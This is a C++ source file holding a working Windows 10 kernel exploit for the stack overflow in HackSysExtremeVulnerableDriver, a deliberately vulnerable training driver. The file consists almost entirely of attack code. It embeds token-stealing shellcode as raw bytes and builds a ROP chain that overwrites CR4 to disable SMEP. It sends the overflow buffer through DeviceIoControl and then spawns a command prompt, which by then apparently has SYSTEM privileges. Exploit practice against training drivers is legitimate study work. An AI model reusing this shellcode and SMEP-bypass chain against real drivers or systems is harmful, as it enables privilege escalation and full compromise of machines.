#include <iostream>
#include <windows.h>
#include <psapi.h>

// tested on Windows 10 64bit 1607

// QWORD is nicer!
typedef uint64_t QWORD;

//
// https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h
// this defines the CTL_CODE, particularly:
// #define HEVD_IOCTL_BUFFER_OVERFLOW_STACK IOCTL(0x800)
// 
// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code
#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
//
// https://jb05s.github.io/HEVD-Driver-Exploitation-Part-2-Stack-Overflow/
#define HEVD_SYM_LINK "\\\\.\\HacksysExtremeVulnerableDriver"

#define ARRAY_SIZE 1024

QWORD GetKernelBase()
{
    LPVOID drivers[ARRAY_SIZE];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    return (QWORD)drivers[0];
}

int main()
{
    // get a handle to the driver using the Symbolic link
    HANDLE hDevice = CreateFileA(HEVD_SYM_LINK, GENERIC_READ | GENERIC_WRITE, 0 , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

    // if CreateFileA fails the handle will be -0x1
    if (hDevice == (HANDLE)-0x1)
    {
        printf("[+] Driver handle: 0x%p\n", hDevice);
        printf("[!] Unable to get a handle to the driver.\n");
        return 1;
    }
    else
    {       
        // token stealing shellcode - 64bit
        const unsigned char shellcode[] = { 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC0, 0x41, 0xB9, 0x04, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x80, 0xF0, 0x02, 0x00, 0x00, 0x49, 0x81, 0xE8, 0xF0, 0x02, 0x00, 0x00, 0x4D, 0x39, 0x88, 0xE8, 0x02, 0x00, 0x00, 0x75, 0xE9, 0x49, 0x8B, 0x88, 0x58, 0x03, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 0x88, 0x58, 0x03, 0x00, 0x00, 0x48, 0x31, 0xC0, 0x48, 0x31, 0xF6, 0x48, 0x83, 0xC4, 0x40, 0xC3 };

        // the saved return address offset and overflow sizes 64bit
        const size_t len = 2088;
        const size_t offset = 2056;

         
        // allocate memory for the shellcode
        LPVOID alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!alloc)
        {
            printf("[!] Unable to allocate memory for the shellcode. Error code: %d\n", GetLastError());
            return 1;
        }

        printf("[+] Memory allocated: 0x%p\n", alloc);

        // copy the shellcode in to the memory
        RtlMoveMemory(alloc, shellcode, sizeof(shellcode));
        printf("[+] Shellcode copied to: 0x%p\n", alloc);

        // the buffer, fill with As
        char buffer[len];
        memset(buffer, 0x41, offset);
        
        
        // overwrite the saved return address with ROP chain, then our shellcode address
        // nt + 0x13439b: pop rcx ; ret ; (1 found)
        // 0xf806050000000000 (our value popped in to rcx)
        // nt + 0x3d6325: mov cr4, rcx ; ret ; (1 found)
        // get the kernel base address
        QWORD kernelBase = GetKernelBase();
        printf("[+] Kernel base is: 0x%p\n", kernelBase);

        int index = 0;
        QWORD POP_RCX = kernelBase + 0x13439b;
        QWORD MOV_CR4_RCX = kernelBase + 0x3d6325;

        // rop chain
        QWORD* rop = (QWORD*)((QWORD)buffer + offset);

        *(rop + index++) = POP_RCX;
        *(rop + index++) = 0x050678;
        *(rop + index++) = MOV_CR4_RCX;
        *(rop + index++) = (QWORD)alloc;
        

        // some output
        printf("[+] Driver handle: 0x%p\n", hDevice);
        printf("[!] Press enter when ready...");
        getchar();

        printf("[+] Sending buffer to IOCTL: 0x%p...\n", HEVD_IOCTL_BUFFER_OVERFLOW_STACK);

        // interact with the driver using an IOCTL
        DWORD bytesRet;
        DeviceIoControl(hDevice, HEVD_IOCTL_BUFFER_OVERFLOW_STACK, buffer, len, NULL, 0, &bytesRet, NULL);
        printf("[+] Hopefully the magic has happened...\n");
        printf("[+] Spawning new process..\n\n");
        
        // span a new command prompt
        system("cmd.exe");

        // close the driver handle
        CloseHandle(hDevice);
    }

    return 0;
}
